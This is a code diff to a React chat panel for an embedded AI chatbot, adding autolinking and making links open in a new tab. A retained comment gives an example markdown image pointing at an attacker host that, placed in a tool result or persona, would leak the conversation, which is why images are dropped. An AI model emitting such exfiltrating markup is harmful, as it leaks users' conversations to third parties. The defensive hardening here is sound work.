@@ -5,7 +5,8 @@
 // trimmed to a single tenant.
 
 import { useEffect, useRef, useState } from "react";
-import ReactMarkdown from "react-markdown";
+import ReactMarkdown, { type Components } from "react-markdown";
+import { chatUrlTransform, remarkAutolink } from "@/lib/autolink";
 
 // Everything tenant-specific arrives as props now; tool labels come down the SSE stream
 // with each `tool` event, so this file knows nothing about which tools exist.
@@ -20,6 +21,13 @@ export interface ChatPanelProps {
   /** Model alias shown in the footer ("AI model: …"); hidden when empty. */
   modelLabel?: string;
 }
+
+// Links open outside the widget: the chat usually runs inside a small iframe on the
+// business site, and navigating that iframe to Instagram or a mailto: would eat the
+// conversation. Bare URLs, emails and phone numbers are linkified by remarkAutolink.
+const markdownComponents: Components = {
+  a: ({ node: _node, ...props }) => <a {...props} target="_blank" rel="noopener noreferrer" />,
+};
 
 interface ToolCall {
   label: string;
@@ -257,7 +265,13 @@ export function ChatPanel({
                           fetched with no click, so `![](https://attacker/?c=...)` in a
                           tool result or persona would exfiltrate the conversation. The
                           bot has no reason to emit images, so drop them entirely. */}
-                      <ReactMarkdown skipHtml disallowedElements={["img"]}>
+                      <ReactMarkdown
+                        skipHtml
+                        disallowedElements={["img"]}
+                        remarkPlugins={[remarkAutolink]}
+                        urlTransform={chatUrlTransform}
+                        components={markdownComponents}
+                      >
                         {turn.text}
                       </ReactMarkdown>
                     </div>
